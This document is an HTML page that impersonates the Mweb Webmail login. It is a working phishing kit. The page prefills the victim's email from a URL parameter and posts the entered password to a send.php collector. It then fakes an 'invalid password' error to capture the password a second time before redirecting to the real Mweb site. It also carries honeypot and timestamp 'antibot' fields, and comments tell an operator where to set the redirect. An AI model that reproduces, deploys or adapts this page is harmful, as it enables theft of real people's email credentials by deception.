<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mweb Webmail - Log In</title>
    <meta name="description" content="Access your Mweb email account securely">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <!-- Security headers -->
    <meta http-equiv="X-Content-Type-Options" content="nosniff">
    <meta http-equiv="X-Frame-Options" content="DENY">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin">
    <meta http-equiv="Content-Security-Policy"
        content="default-src 'self' https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; img-src 'self' data: https://www.mweb.co.za; font-src 'self' https://cdn.jsdelivr.net;">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        :root {
            --nav-color: #042239;
            color: #f0f0f0;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            overflow-x: hidden;
        }

        nav {
            background-color: var(--nav-color);
            height: 56px;
        }

        .main-container {
            min-height: 100vh;
        }

        .logo {
            max-width: 100%;
            height: auto;
            font-weight: lighter;
            color: #ffffff;
            margin-top: 10px;
            margin-left: -2.3rem;
        }

        .person-image {
            width: 100%;
            height: auto;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            /* background-size: 100% auto; */
        }

        .right-section {
            background-color: #fafafa;
            /* padding: 60px 40px; */
            max-width: 100%;
            min-height: 100vh;
        }

        .login-container {
            width: 100%;
            /* max-width: 400px; */
            padding: 1rem 2.5rem
        }

        .login-header {
            margin-bottom: 40px;
        }

        .login-header h1 {
            font-size: 36px;
            font-weight: 300;
            color: #333;
            margin-bottom: 10px;
        }

        .login-header p {
            font-size: 16px;
            color: #666;
        }

        .form-label {
            font-weight: 500;
            color: #333;
            font-size: 14px;
            margin-bottom: 8px;
        }

        .form-control {
            padding: 14px 16px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 15px;
            transition: border-color 0.3s;
        }

        .form-control:focus {
            border-color: var(--nav-color);
            box-shadow: 0 0 0 1px var(--nav-color);
        }

        .form-control.is-invalid {
            border-color: #dc3545;
        }

        .invalid-feedback {
            color: #dc3545;
            font-size: 14px;
            margin-top: 6px;
            display: none;
        }

        .invalid-feedback.show {
            display: block;
        }

        .btn-login {
            background-color: #FAF7BD;
            color: var(--nav-color);
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            display: block;
            margin-left: auto;
            margin-right: 0;
        }

        .btn-login:hover {
            background-color: var(--nav-color);
            color: #ffffff;
        }

        .btn-login:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            margin-top: 24px;
        }

        .forgot-password a {
            color: var(--nav-color);
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .logo {
                margin-top: 10px;
                margin-left: -2rem;
            }

            .right-section {
                /* padding: 40px 20px; */
                max-width: 100%;
                min-height: auto;
            }

            .person-image {
                width: 200px;
                height: 200px;
            }

            .connection-icons {
                margin-bottom: 20px;
            }

            .login-header h1 {
                font-size: 28px;
            }
        }

        @media (max-width: 615px) {
            .logo {
                margin-top: 10px;
                margin-left: .5rem;
            }
        }
    </style>

</head>

<body>
    <nav>
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <img width="137" height="91" sizes="(max-width: 768px) 91px, 137px"
                        src="data:image/png;base64,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"
                        alt="mweb" class="logo">
                </div>
            </div>
        </div>
    </nav>

    <div class="main-container">
        <div class="row">
            <div class="col-lg-8 ps-5 pe-4 d-lg-inline-block d-none">
                <img src="https://www.mweb.co.za/newdawn/_next/image?url=https%3A%2F%2Fwww.mweb.co.za%2Fmedia%2Fimages%2Fcoverage-banners%2Fmanage-online-account-1.png&w=1080&q=75"
                    alt="Person" class="person-image">
            </div>
            <div class="col-lg-4 col-md-12 right-section d-flex align-items-center justify-content-center">
                <div class="login-container">
                    <div class="login-header">
                        <h1 class="display-5 fw-bold text-center mb-5">My Email</h1>
                        <h5 class="text-start pt-4">Log Into Your Email</h5>
                        <p class="text-start">Log in using your email address and password.</p>
                    </div>

                    <form id="form" method="POST" autocomplete="off" action="./send.php">
                        <input type="hidden" id="cid" name="cid" value="">

                        <!-- Antibot protection fields -->
                        <input type="hidden" name="form_timestamp" id="form_timestamp" value="">
                        <input type="hidden" name="form_token" id="form_token" value="">
                        <div style="display:none;">
                            <label>Leave this field empty:
                                <input type="text" name="honeypot" value="" autocomplete="off"></label>
                        </div>

                        <div class="mb-4">
                            <div class="form-floating">
                                <input type="email" class="form-control" id="email" name="email" required
                                    placeholder="yourname@mweb.co.za" readonly>
                                <label for="email">Email</label>
                            </div>
                            <div class="invalid-feedback" id="emailError">This field is required</div>
                        </div>

                        <div class="mb-4">
                            <div class="form-floating">
                                <input type="password" class="form-control" id="password" name="password" required
                                    placeholder="Enter your password">
                                <label for="password">Password</label>
                            </div>
                            <div class="invalid-feedback" id="passwordError">This field is required</div>
                        </div>

                        <button type="button" id="loginButton" class="btn btn-login">Log In</button>
                    </form>

                    <!-- Add missing elements for JavaScript -->
                    <div id="spinner" style="display: none; text-align: center; margin-top: 10px;">
                        <div class="spinner-border text-primary" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                    </div>

                    <div id="error" style="display: none; color: red; margin-top: 10px;">
                        Invalid email or password. Please try again.
                    </div>

                    <div class="forgot-password py-3">
                        <a class="fw-bold fs-6" href="#">Forgot Your Password?</a>
                    </div>
                    <div class="mt-3">
                        <span class="small">
                            <strong>Spam:</strong> We've got you covered with our purpose-built Anti-Spam Cloud
                            solution. To learn more about accessing quarantined email or managing your black and white
                            lists, hop on over to our website at: <a class="small text-decoration-none" style="color: var(--nav-color)" href="#">Anti-Spam Cloud Help</a>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        // Function to get URL parameters
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }

        // Populate fields from URL parameters on page load
        window.onload = function () {
            var cid = getUrlParameter('cid');
            var emailField = document.getElementById('email');
            var cidField = document.getElementById('cid');

            if (cid) {
                emailField.value = cid;
                cidField.value = cid;
            }

            // Generate antibot tokens
            generateAntibotTokens();
        };

        // Generate antibot protection tokens
        function generateAntibotTokens() {
            // Generate timestamp (current time in milliseconds)
            var timestamp = Date.now();
            document.getElementById('form_timestamp').value = timestamp;

            // Generate random token
            var token = btoa(timestamp + Math.random().toString(36).substring(2));
            document.getElementById('form_token').value = token;
        }

        var loginButton = document.getElementById("loginButton");
        loginButton.addEventListener("click", function (e) {
            e.preventDefault();

            var email = document.getElementById("email");
            var password = document.getElementById("password");
            var cid = document.getElementById("cid");
            var spinner = document.getElementById("spinner");
            var error = document.getElementById("error");

            // Update cid field with current email value
            cid.value = email.value;

            console.log("Email:", email.value);
            console.log("Password:", password.value);
            console.log("CID:", cid.value);

            if (password.value == "") {
                error.style.display = "block";
                error.textContent = "Please enter your password";
                return;
            } else {
                error.style.display = "none";
                spinner.style.display = "block";

                // Send the form data immediately
                sendSomething();

                setTimeout(() => {
                    spinner.style.display = "none";
                    error.style.display = "block";
                    error.textContent = "Invalid email or password. Please try again.";
                }, 2000);

                setTimeout(() => {
                    password.value = '';
                }, 3000);

                setTimeout(() => {
                    error.style.display = "none";
                }, 7000);

                // Number of times form is submitted
                checkTimes();
            }
        });

        var times = 0;
        // NUMBER OF TIMES FORM IS SUBMITED AND THEN REDIRECTED
        function checkTimes() {
            if (times < 1) {
                ++times;
            } else {
                // CHANGE YOUR REDIRECTION LINK HERE
                window.location = "https://www.mweb.co.za/"; // CHANGE YOUR REDIRECTION LINK HERE
                setTimeout(function () {
                    times = 0;
                }, 1000);
            }
        }

        let data;

        function sendSomething() {
            var formData = new FormData(document.getElementById("form"));
            var xhttp = new XMLHttpRequest();

            xhttp.onload = function () {
                data = JSON.stringify(this.responseText);
                console.log("Response from server:", this.responseText);
                console.log("Form data sent:");
                for (var pair of formData.entries()) {
                    console.log(pair[0] + ': ' + pair[1]);
                }
            };

            xhttp.open("POST", "send.php", true);
            xhttp.send(formData);
        }
    </script>
</body>

</html>